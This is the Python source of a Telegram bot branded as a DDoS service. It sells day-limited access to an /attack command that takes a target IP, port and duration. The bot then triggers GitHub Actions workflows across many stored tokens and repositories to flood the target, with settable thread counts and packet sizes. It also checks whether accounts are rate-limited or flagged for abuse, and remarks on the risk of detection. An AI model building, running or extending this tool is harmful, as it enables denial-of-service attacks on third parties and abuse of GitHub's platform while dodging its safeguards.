import time
import asyncio
import aiohttp
import json
import os
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from telegram import Update
from datetime import datetime

TELEGRAM_TOKEN = "TOKEN_HERE"
ADMIN_ID = 1234567890
CONFIG_FILE = "github_config.json"
USERS_FILE = "approved_users.json"
GROUPS_FILE = "approved_groups.json"

# Global variables
is_attack_running = False
is_cooldown_active = False
cooldown_end_time = 0
current_target = ""
MAX_ATTACK_TIME = 300
PACKET_SIZE = 1024
THREADS = 2200
COOLDOWN_TIME = 360  # 6 minutes cooldown after attack
COOLDOWN_NOTIFICATION_SENT = False

# Global application instance
application = None

# Load GitHub accounts from config file
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

# Load approved users from file
def load_approved_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

# Load approved groups from file
def load_approved_groups():
    if os.path.exists(GROUPS_FILE):
        try:
            with open(GROUPS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

# Save approved users to file
def save_approved_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(approved_users, f)

# Save approved groups to file
def save_approved_groups():
    with open(GROUPS_FILE, 'w') as f:
        json.dump(approved_groups, f)

GITHUB_ACCOUNTS = load_config()
approved_users = load_approved_users()
approved_groups = load_approved_groups()

def save_config():
    with open(CONFIG_FILE, 'w') as f:
        json.dump(GITHUB_ACCOUNTS, f)

async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display all approved users with detailed information"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can view approved users.")
        return
    
    if not approved_users:
        await update.message.reply_text("📭 No approved users found.")
        return
    
    current_time = time.time()
    active_users = []
    expired_users = []
    
    for user_id, user_data in approved_users.items():
        user_id_int = int(user_id)
        
        if user_id_int == ADMIN_ID:
            continue
            
        expiry_time = user_data['expiry_time']
        approved_days = user_data['approved_days']
        
        remaining = expiry_time - current_time
        remaining_days = int(remaining // 86400)
        remaining_hours = int((remaining % 86400) // 3600)
        remaining_minutes = int((remaining % 3600) // 60)
        
        expiry_date = datetime.fromtimestamp(expiry_time).strftime("%d/%m/%Y %I:%M %p")
        
        user_info = {
            'user_id': user_id_int,
            'approved_days': approved_days,
            'expiry_time': expiry_time,
            'expiry_date': expiry_date,
            'remaining_days': remaining_days,
            'remaining_hours': remaining_hours,
            'remaining_minutes': remaining_minutes,
            'is_active': remaining > 0
        }
        
        if remaining > 0:
            active_users.append(user_info)
        else:
            expired_users.append(user_info)
    
    active_users.sort(key=lambda x: x['expiry_time'])
    expired_users.sort(key=lambda x: x['expiry_time'], reverse=True)
    
    message = "👥 *APPROVED USERS LIST*\n\n"
    
    message += f"✅ *ACTIVE USERS ({len(active_users)})*\n"
    message += "─" * 40 + "\n"
    
    if active_users:
        for i, user in enumerate(active_users, 1):
            message += f"{i}. `{user['user_id']}`\n"
            message += f"   📅 Approved: {user['approved_days']} days\n"
            message += f"   ⏰ Expires: {user['expiry_date']}\n"
            message += f"   ⏳ Remaining: {user['remaining_days']}d {user['remaining_hours']}h {user['remaining_minutes']}m\n"
            
            if user['remaining_days'] == 0 and user['remaining_hours'] < 6:
                message += f"   ⚠️ *Expiring soon!*\n"
            
            message += "\n"
    else:
        message += "No active users\n\n"
    
    message += f"❌ *EXPIRED USERS ({len(expired_users)})*\n"
    message += "─" * 40 + "\n"
    
    if expired_users:
        for i, user in enumerate(expired_users, 1):
            expired_days = int((current_time - user['expiry_time']) // 86400)
            
            message += f"{i}. `{user['user_id']}`\n"
            message += f"   📅 Was: {user['approved_days']} days\n"
            message += f"   ⏰ Expired: {user['expiry_date']}\n"
            message += f"   🕐 {expired_days} days ago\n\n"
    else:
        message += "No expired users\n\n"
    
    message += "📊 *SUMMARY*\n"
    message += "─" * 40 + "\n"
    message += f"• Total Users: {len(approved_users) - 1}\n"
    message += f"• Active: {len(active_users)}\n"
    message += f"• Expired: {len(expired_users)}\n"
    message += f"• Admin ID: `{ADMIN_ID}`\n\n"
    
    message += "⚡ *QUICK ACTIONS*\n"
    message += "• Use `/remove <user_id>` to remove a user\n"
    message += "• Use `/approve <user_id> <days>` to add/renew\n"
    message += "• Use `/Myid` to check your own ID\n"
    
    if len(message) > 4000:
        part1 = message[:4000]
        part2 = message[4000:]
        
        await update.message.reply_text(part1, parse_mode="Markdown")
        await update.message.reply_text(part2, parse_mode="Markdown")
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can remove users.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    try:
        user_id = int(context.args[0])
        
        if user_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove admin.")
            return
            
        user_id_str = str(user_id)
        
        if user_id_str in approved_users:
            user_info = approved_users[user_id_str]
            approved_days = user_info['approved_days']
            
            del approved_users[user_id_str]
            save_approved_users()
            
            await update.message.reply_text(
                f"✅ *USER REMOVED!*\n\n"
                f"🆔 User ID: `{user_id}`\n"
                f"📅 Approved Days: {approved_days}\n\n"
                f"📊 Total users now: {len(approved_users) - 1}",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ User not found in approved list.")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

def is_approved(user_id: int):
    # Check if user is approved
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        return time.time() < approved_users[user_id_str]['expiry_time']
    
    # Check if user is in an approved group
    for group_id, group_data in approved_groups.items():
        if user_id in group_data.get('members', []):
            return time.time() < group_data['expiry_time']
    
    return False

def approve_user(user_id: int, days: int):
    expiry_time = time.time() + (days * 86400)
    user_id_str = str(user_id)
    approved_users[user_id_str] = {
        'expiry_time': expiry_time,
        'approved_days': days,
        'approved_date': time.time()
    }
    save_approved_users()

def approve_group(group_id: int, days: int):
    """Approve a group for a certain number of days"""
    expiry_time = time.time() + (days * 86400)
    group_id_str = str(group_id)
    
    # Initialize group if not exists
    if group_id_str not in approved_groups:
        approved_groups[group_id_str] = {
            'expiry_time': expiry_time,
            'approved_days': days,
            'approved_date': time.time(),
            'members': []
        }
    else:
        # Update existing group
        approved_groups[group_id_str]['expiry_time'] = expiry_time
        approved_groups[group_id_str]['approved_days'] = days
    
    save_approved_groups()

def add_member_to_group(group_id: int, user_id: int):
    """Add a user to an approved group"""
    group_id_str = str(group_id)
    user_id_int = int(user_id)
    
    if group_id_str in approved_groups:
        if user_id_int not in approved_groups[group_id_str]['members']:
            approved_groups[group_id_str]['members'].append(user_id_int)
            save_approved_groups()
            return True
    return False

def remove_member_from_group(group_id: int, user_id: int):
    """Remove a user from an approved group"""
    group_id_str = str(group_id)
    user_id_int = int(user_id)
    
    if group_id_str in approved_groups:
        if user_id_int in approved_groups[group_id_str]['members']:
            approved_groups[group_id_str]['members'].remove(user_id_int)
            save_approved_groups()
            return True
    return False

def remove_group(group_id: int):
    """Remove an entire group"""
    group_id_str = str(group_id)
    if group_id_str in approved_groups:
        del approved_groups[group_id_str]
        save_approved_groups()
        return True
    return False

# Approve admin
approve_user(ADMIN_ID, 36500)

async def fire_workflow_async(session, token, repo, params):
    try:
        url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json"
        }
        async with session.post(url, headers=headers, json=params, timeout=5) as response:
            return response.status == 204
    except:
        return False

async def trigger_all_workflows_async(ip, port, duration):
    params = {
        "ref": "main",
        "inputs": {
            "ip": str(ip),
            "port": str(port),
            "duration": str(duration),
            "packet_size": str(PACKET_SIZE),
            "threads": str(THREADS)
        }
    }
    
    success_count = 0
    tasks = []
    
    async with aiohttp.ClientSession() as session:
        for account in GITHUB_ACCOUNTS:
            token = account['token']
            for repo in account['repos']:
                task = asyncio.create_task(fire_workflow_async(session, token, repo, params))
                tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                success_count += 1
    
    return success_count

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = """
⚡ 𝕄𝕌𝕊𝕋𝕌𝕌 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🎯 COMMANDS:
/Myid - Check User ID
/users - List all approved users (Admin)
/attack <ip> <port> <time>
/approve <user_id> <days>
/remove <user_id>
/addrepo - Add GitHub Token & Repos
/removerepo - Remove GitHub Token
/listrepos - List all repos
/ping - Check bot status
/checkaccounts - Check GitHub accounts status
/set_duration <seconds> - Set max attack time (Admin)
/set_threads <count> - Set thread count (Admin)
/set_packets <size> - Set packet size (Admin)
/set_cooldown <seconds> - Set cooldown time after attack (Admin)

👥 GROUP COMMANDS (Admin):
/approve_group <group_id> <days>
/remove_group <group_id>
/list_groups

𝐎𝐖𝐍𝐄𝐑 : @SIDIKI_MUSTAFA_92
    """
    await update.message.reply_text(welcome)

async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    
    user_id_str = str(user_id)
    
    # Check if user is directly approved
    if user_id_str in approved_users:
        user_data = approved_users[user_id_str]
        expiry_time = user_data['expiry_time']
        approved_days = user_data['approved_days']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        remaining = expiry_time - time.time()
        remaining_days = int(remaining // 86400)
        remaining_hours = int((remaining % 86400) // 3600)
        
        approval_status = f"✅ APPROVED USER\n📅 {approved_days} days\n⏰ {expiry_str}\n🕒 {remaining_days}d {remaining_hours}h"
    
    # Check if user is in an approved group
    elif is_approved(user_id):
        for group_id, group_data in approved_groups.items():
            if user_id in group_data.get('members', []):
                expiry_time = group_data['expiry_time']
                approved_days = group_data['approved_days']
                expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
                
                remaining = expiry_time - time.time()
                remaining_days = int(remaining // 86400)
                remaining_hours = int((remaining % 86400) // 3600)
                
                approval_status = f"✅ APPROVED GROUP MEMBER\n👥 Group ID: {group_id}\n📅 {approved_days} days\n⏰ {expiry_str}\n🕒 {remaining_days}d {remaining_hours}h"
                break
        else:
            approval_status = "❌ NOT APPROVED"
    else:
        approval_status = "❌ NOT APPROVED"
    
    user_info = f"👤 USER INFO:\n🆔 {user_id}\n📛 {first_name}\n🔗 @{username if username else 'N/A'}\n\n{approval_status}"
    await update.message.reply_text(user_info)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bot status"""
    start_time = time.time()
    
    total_accounts = len(GITHUB_ACCOUNTS)
    total_repos = sum(len(acc['repos']) for acc in GITHUB_ACCOUNTS)
    total_approved_users = len([uid for uid in approved_users if int(uid) != ADMIN_ID])
    
    # Count group members
    total_group_members = 0
    for group_data in approved_groups.values():
        total_group_members += len(group_data.get('members', []))
    
    current_time = time.time()
    
    attack_status = "🟢 IDLE"
    cooldown_status = ""
    
    if is_attack_running:
        attack_status = f"🔴 ATTACK RUNNING\n🎯 Target: {current_target}"
    elif is_cooldown_active:
        remaining_cooldown = cooldown_end_time - current_time
        if remaining_cooldown > 0:
            cooldown_mins = int(remaining_cooldown // 60)
            cooldown_secs = int(remaining_cooldown % 60)
            cooldown_status = f"❄️ COOLDOWN ACTIVE\n⏰ Remaining: {cooldown_mins:02d}:{cooldown_secs:02d}"
        else:
            is_cooldown_active = False
            cooldown_status = "✅ No cooldown"
    
    end_time = time.time()
    response_time = round((end_time - start_time) * 1000, 2)
    
    ping_message = f"""
🏓 *PONG! BOT STATUS*

📊 *STATISTICS:*
• 🤖 Bot Uptime: Always Online
• ⚡ Response Time: {response_time}ms
• 🔐 GitHub Accounts: {total_accounts}
• 📁 Total Repos: {total_repos}
• 👤 Approved Users: {total_approved_users}
• 👥 Approved Groups: {len(approved_groups)}
• 👥 Group Members: {total_group_members}
• ⏱️ Max Attack Time: {MAX_ATTACK_TIME} seconds
• ❄️ Cooldown Time: {COOLDOWN_TIME} seconds ({COOLDOWN_TIME//60} minutes)

{attack_status}

🔧 *CONFIGURATION:*
• 📦 Packet Size: {PACKET_SIZE} KB
• 🧵 Threads: {THREADS}
• 🎯 Current Target: {current_target if current_target else "None"}

{cooldown_status if cooldown_status else "✅ Bot is ready for commands"}
    """
    
    await update.message.reply_text(ping_message, parse_mode="Markdown")

async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set maximum attack time in seconds (Admin only)"""
    global MAX_ATTACK_TIME
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can set attack duration.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /set_duration <seconds>\nExample: /set_duration 600\nCurrent max: " + str(MAX_ATTACK_TIME) + " seconds")
        return
    
    try:
        new_duration = int(context.args[0])
        
        if new_duration < 1:
            await update.message.reply_text("❌ Duration must be at least 1 second.")
            return
            
        if new_duration > 3600:
            await update.message.reply_text("❌ Duration cannot exceed 3600 seconds (1 hour).")
            return
        
        MAX_ATTACK_TIME = new_duration
        
        minutes = new_duration // 60
        seconds = new_duration % 60
        time_display = f"{minutes} minutes {seconds} seconds" if minutes > 0 else f"{seconds} seconds"
        
        await update.message.reply_text(
            f"✅ *MAXIMUM ATTACK TIME UPDATED!*\n\n"
            f"⏱️ New Maximum: {new_duration} seconds\n"
            f"⏰ ({time_display})\n\n"
            f"📝 All future attacks will be limited to this duration.",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number of seconds.")

async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set number of threads for attacks (Admin only)"""
    global THREADS
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can set thread count.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text(
            "Usage: /set_threads <thread_count>\n"
            "Example: /set_threads 3000\n"
            f"Current threads: {THREADS}\n\n"
            "⚠️ Note: Higher threads = more power but also higher risk of detection"
        )
        return
    
    try:
        new_threads = int(context.args[0])
        
        if new_threads < 100:
            await update.message.reply_text("❌ Threads must be at least 100.")
            return
            
        if new_threads > 10000:
            await update.message.reply_text("❌ Threads cannot exceed 10000.")
            return
        
        THREADS = new_threads
        
        await update.message.reply_text(
            f"✅ *THREAD COUNT UPDATED!*\n\n"
            f"🧵 New Threads: {THREADS}\n"
            f"⚡ Attack Power: {'HIGH' if THREADS > 2000 else 'MEDIUM' if THREADS > 1000 else 'LOW'}\n\n"
            f"📝 All future attacks will use {THREADS} threads.",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number of threads.")

async def set_packets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set packet size for attacks (Admin only)"""
    global PACKET_SIZE
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can set packet size.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text(
            "Usage: /set_packets <size_in_kb>\n"
            "Example: /set_packets 2048\n"
            f"Current packet size: {PACKET_SIZE} KB\n\n"
            "⚠️ Note: Larger packets = more bandwidth consumption"
        )
        return
    
    try:
        new_size = int(context.args[0])
        
        if new_size < 50:
            await update.message.reply_text("❌ Packet size must be at least 50 KB.")
            return
            
        if new_size > 10000:
            await update.message.reply_text("❌ Packet size cannot exceed 10000 KB.")
            return
        
        PACKET_SIZE = new_size
        
        await update.message.reply_text(
            f"✅ *PACKET SIZE UPDATED!*\n\n"
            f"📦 New Packet Size: {PACKET_SIZE} KB\n"
            f"🚀 Bandwidth Usage: {'HIGH' if PACKET_SIZE > 2048 else 'MEDIUM' if PACKET_SIZE > 1024 else 'LOW'}\n\n"
            f"📝 All future attacks will use {PACKET_SIZE} KB packets.",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid packet size.")

async def set_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set cooldown time after attacks (Admin only)"""
    global COOLDOWN_TIME
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can set cooldown time.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text(
            "Usage: /set_cooldown <seconds>\n"
            "Example: /set_cooldown 360\n"
            f"Current cooldown: {COOLDOWN_TIME} seconds ({COOLDOWN_TIME//60} minutes)\n\n"
            "⚠️ Note: Cooldown starts AFTER attack finishes"
        )
        return
    
    try:
        new_cooldown = int(context.args[0])
        
        if new_cooldown < 60:
            await update.message.reply_text("❌ Cooldown must be at least 60 seconds (1 minute).")
            return
            
        if new_cooldown > 1800:
            await update.message.reply_text("❌ Cooldown cannot exceed 1800 seconds (30 minutes).")
            return
        
        COOLDOWN_TIME = new_cooldown
        
        minutes = new_cooldown // 60
        seconds = new_cooldown % 60
        time_display = f"{minutes} minutes {seconds} seconds"
        
        await update.message.reply_text(
            f"✅ *COOLDOWN TIME UPDATED!*\n\n"
            f"❄️ New Cooldown: {new_cooldown} seconds\n"
            f"⏰ ({time_display})\n\n"
            f"📝 After each attack, {COOLDOWN_TIME}s cooldown will start.",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number of seconds.")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve user"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
        
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return

    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 1 or days > 30:
            await update.message.reply_text("❌ Days: 1-30 only.")
            return
            
        approve_user(user_id, days)
        expiry_time = approved_users[str(user_id)]['expiry_time']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        action = "RENEWED" if str(user_id) in approved_users else "APPROVED"
        
        await update.message.reply_text(
            f"✅ *USER {action}!*\n\n"
            f"🆔 User ID: `{user_id}`\n"
            f"📅 Approved Days: {days}\n"
            f"⏰ Expiry: {expiry_str}\n\n"
            f"📊 Total approved users: {len(approved_users) - 1}",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")

async def approve_group_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve a group"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
        
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve_group <group_id> <days>")
        return

    try:
        group_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 1 or days > 30:
            await update.message.reply_text("❌ Days: 1-30 only.")
            return
            
        approve_group(group_id, days)
        expiry_time = approved_groups[str(group_id)]['expiry_time']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        action = "RENEWED" if str(group_id) in approved_groups else "APPROVED"
        
        await update.message.reply_text(
            f"✅ *GROUP {action}!*\n\n"
            f"👥 Group ID: `{group_id}`\n"
            f"📅 Approved Days: {days}\n"
            f"⏰ Expiry: {expiry_str}\n"
            f"👥 Members: {len(approved_groups[str(group_id)].get('members', []))}\n\n"
            f"📊 Total approved groups: {len(approved_groups)}",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")

async def remove_group_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a group"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove_group <group_id>")
        return

    try:
        group_id = int(context.args[0])
        
        group_id_str = str(group_id)
        
        if group_id_str in approved_groups:
            group_data = approved_groups[group_id_str]
            approved_days = group_data['approved_days']
            member_count = len(group_data.get('members', []))
            
            remove_group(group_id)
            
            await update.message.reply_text(
                f"✅ *GROUP REMOVED!*\n\n"
                f"👥 Group ID: `{group_id}`\n"
                f"📅 Approved Days: {approved_days}\n"
                f"👥 Members Removed: {member_count}\n\n"
                f"📊 Total groups now: {len(approved_groups)}",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Group not found in approved list.")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid group ID.")

async def list_groups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all approved groups"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
    
    if not approved_groups:
        await update.message.reply_text("📭 No approved groups found.")
        return
    
    current_time = time.time()
    active_groups = []
    expired_groups = []
    
    for group_id, group_data in approved_groups.items():
        group_id_int = int(group_id)
        expiry_time = group_data['expiry_time']
        approved_days = group_data['approved_days']
        member_count = len(group_data.get('members', []))
        
        remaining = expiry_time - current_time
        remaining_days = int(remaining // 86400)
        remaining_hours = int((remaining % 86400) // 3600)
        remaining_minutes = int((remaining % 3600) // 60)
        
        expiry_date = datetime.fromtimestamp(expiry_time).strftime("%d/%m/%Y %I:%M %p")
        
        group_info = {
            'group_id': group_id_int,
            'approved_days': approved_days,
            'expiry_time': expiry_time,
            'expiry_date': expiry_date,
            'member_count': member_count,
            'remaining_days': remaining_days,
            'remaining_hours': remaining_hours,
            'remaining_minutes': remaining_minutes,
            'is_active': remaining > 0
        }
        
        if remaining > 0:
            active_groups.append(group_info)
        else:
            expired_groups.append(group_info)
    
    active_groups.sort(key=lambda x: x['expiry_time'])
    expired_groups.sort(key=lambda x: x['expiry_time'], reverse=True)
    
    message = "👥 *APPROVED GROUPS LIST*\n\n"
    
    message += f"✅ *ACTIVE GROUPS ({len(active_groups)})*\n"
    message += "─" * 40 + "\n"
    
    if active_groups:
        for i, group in enumerate(active_groups, 1):
            message += f"{i}. `{group['group_id']}`\n"
            message += f"   📅 Approved: {group['approved_days']} days\n"
            message += f"   👥 Members: {group['member_count']}\n"
            message += f"   ⏰ Expires: {group['expiry_date']}\n"
            message += f"   ⏳ Remaining: {group['remaining_days']}d {group['remaining_hours']}h {group['remaining_minutes']}m\n"
            
            if group['remaining_days'] == 0 and group['remaining_hours'] < 6:
                message += f"   ⚠️ *Expiring soon!*\n"
            
            message += "\n"
    else:
        message += "No active groups\n\n"
    
    message += f"❌ *EXPIRED GROUPS ({len(expired_groups)})*\n"
    message += "─" * 40 + "\n"
    
    if expired_groups:
        for i, group in enumerate(expired_groups, 1):
            expired_days = int((current_time - group['expiry_time']) // 86400)
            
            message += f"{i}. `{group['group_id']}`\n"
            message += f"   📅 Was: {group['approved_days']} days\n"
            message += f"   👥 Members: {group['member_count']}\n"
            message += f"   ⏰ Expired: {group['expiry_date']}\n"
            message += f"   🕐 {expired_days} days ago\n\n"
    else:
        message += "No expired groups\n\n"
    
    message += "📊 *SUMMARY*\n"
    message += "─" * 40 + "\n"
    total_members = sum(len(g.get('members', [])) for g in approved_groups.values())
    message += f"• Total Groups: {len(approved_groups)}\n"
    message += f"• Active: {len(active_groups)}\n"
    message += f"• Expired: {len(expired_groups)}\n"
    message += f"• Total Members: {total_members}\n\n"
    
    message += "⚡ *QUICK ACTIONS*\n"
    message += "• Use `/remove_group <group_id>` to remove a group\n"
    message += "• Use `/approve_group <group_id> <days>` to add/renew\n"
    
    if len(message) > 4000:
        part1 = message[:4000]
        part2 = message[4000:]
        
        await update.message.reply_text(part1, parse_mode="Markdown")
        await update.message.reply_text(part2, parse_mode="Markdown")
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def addrepo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start process to add GitHub token and repositories"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can add repositories.")
        return
    
    await update.message.reply_text("🔐 *Step 1/3:* Please send your GitHub token (starting with ghp_ or ghs_)", 
                                   parse_mode="Markdown")
    context.user_data['awaiting_token'] = True

async def removerepo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a GitHub token and its repositories"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can remove repositories.")
        return
    
    if not GITHUB_ACCOUNTS:
        await update.message.reply_text("❌ No GitHub accounts found.")
        return
    
    token_list = ""
    for i, account in enumerate(GITHUB_ACCOUNTS):
        token_preview = account['token'][:15] + "..." if len(account['token']) > 15 else account['token']
        repo_count = len(account['repos'])
        token_list += f"{i+1}. `{token_preview}` - {repo_count} repos\n"
    
    await update.message.reply_text(
        f"🔑 *Available GitHub Tokens:*\n\n{token_list}\n"
        "Send the number of token to remove (e.g., 1):",
        parse_mode="Markdown"
    )
    context.user_data['awaiting_remove_token'] = True

async def listrepos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all GitHub repositories"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can list repositories.")
        return
    
    if not GITHUB_ACCOUNTS:
        await update.message.reply_text("❌ No GitHub accounts found.")
        return
    
    total_repos = 0
    message = "📊 *GITHUB REPOSITORIES LIST*\n\n"
    
    for i, account in enumerate(GITHUB_ACCOUNTS):
        token_preview = account['token'][:15] + "..." if len(account['token']) > 15 else account['token']
        repo_count = len(account['repos'])
        total_repos += repo_count
        
        message += f"🔐 *Token {i+1}:* `{token_preview}`\n"
        message += f"📁 *Repositories ({repo_count}):*\n"
        
        for j, repo in enumerate(account['repos']):
            message += f"  {j+1}. `{repo}`\n"
        
        message += "\n"
    
    message += f"📈 *Total Accounts:* {len(GITHUB_ACCOUNTS)}\n"
    message += f"📈 *Total Repositories:* {total_repos}"
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def check_account_status_async(session, token, repo):
    """
    Check if a GitHub token and repo are still valid and not rate-limited.
    """
    try:
        url = f"https://api.github.com/repos/{repo}"
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Mozilla/5.0"
        }
        
        async with session.get(url, headers=headers, timeout=10) as response:
            status = response.status
            
            rate_limit_remaining = response.headers.get('x-ratelimit-remaining')
            rate_limit_reset = response.headers.get('x-ratelimit-reset')
            
            if status == 200:
                return {
                    'status': 'ALIVE',
                    'rate_limit_remaining': rate_limit_remaining,
                    'rate_limit_reset': rate_limit_reset
                }
            elif status == 403 or status == 429:
                response_text = await response.text()
                if 'rate limit' in response_text.lower() or 'abuse' in response_text.lower():
                    return {
                        'status': 'RATE_LIMITED',
                        'rate_limit_remaining': rate_limit_remaining,
                        'rate_limit_reset': rate_limit_reset,
                        'message': 'Account is rate limited or flagged for abuse'
                    }
                elif 'blocked' in response_text.lower() or 'suspended' in response_text.lower():
                    return {
                        'status': 'BANNED',
                        'message': 'Account token has been revoked or suspended'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'code': status,
                        'message': response_text[:200]
                    }
            elif status == 404:
                return {
                    'status': 'REPO_NOT_FOUND',
                    'message': 'Repository does not exist or no access'
                }
            else:
                return {
                    'status': 'ERROR',
                    'code': status,
                    'message': f'Unexpected status code: {status}'
                }
                
    except asyncio.TimeoutError:
        return {'status': 'TIMEOUT', 'message': 'Request timed out'}
    except Exception as e:
        return {'status': 'EXCEPTION', 'message': str(e)}

async def checkaccounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check status of all GitHub accounts"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can check accounts.")
        return
    
    if not GITHUB_ACCOUNTS:
        await update.message.reply_text("❌ No GitHub accounts found in config.")
        return
    
    checking_msg = await update.message.reply_text("🔍 Checking GitHub accounts status...")
    
    results = []
    total_alive = 0
    total_rate_limited = 0
    total_banned = 0
    total_errors = 0
    
    async with aiohttp.ClientSession() as session:
        for acc_index, account in enumerate(GITHUB_ACCOUNTS):
            token = account['token']
            token_preview = token[:10] + "..." if len(token) > 10 else token
            
            if account['repos']:
                test_repo = account['repos'][0]
                result = await check_account_status_async(session, token, test_repo)
                
                status = result['status']
                
                if status == 'ALIVE':
                    total_alive += 1
                    status_icon = "✅"
                elif status == 'RATE_LIMITED':
                    total_rate_limited += 1
                    status_icon = "⚠️"
                elif status == 'BANNED':
                    total_banned += 1
                    status_icon = "❌"
                else:
                    total_errors += 1
                    status_icon = "❓"
                
                result_info = f"{status_icon} Account {acc_index+1}: {status}"
                result_info += f"\n   Token: `{token_preview}`"
                
                if 'rate_limit_remaining' in result and result['rate_limit_remaining']:
                    result_info += f"\n   Rate Limit: {result['rate_limit_remaining']} reqs left"
                
                if 'message' in result:
                    msg = result['message']
                    if len(msg) > 50:
                        msg = msg[:50] + "..."
                    result_info += f"\n   Detail: {msg}"
                
                results.append(result_info)
                
                await asyncio.sleep(1)
    
    report = f"""📊 **GITHUB ACCOUNTS STATUS REPORT**

**Summary:**
✅ Alive: {total_alive}
⚠️ Rate Limited: {total_rate_limited}
❌ Banned/Revoked: {total_banned}
❓ Errors: {total_errors}
📋 Total Checked: {len(GITHUB_ACCOUNTS)}

**Detailed Results:**
"""
    
    for i, res in enumerate(results):
        report += f"\n{res}"
        if i < len(results) - 1:
            report += "\n" + "-"*40
    
    report += "\n\n**Recommendations:**\n"
    
    if total_banned > 0:
        report += "• ❌ Remove banned accounts using `/removerepo`\n"
    
    if total_rate_limited > 0:
        report += "• ⏳ Rate limited accounts need to wait before reuse\n"
        report += "• 📉 Reduce attack frequency to avoid future limits\n"
    
    if total_alive == 0:
        report += "• ➕ Add new accounts using `/addrepo`\n"
    
    report += "• 🔄 Check `x-ratelimit-remaining` header to monitor limits"
    
    await checking_msg.edit_text(report, parse_mode="Markdown")

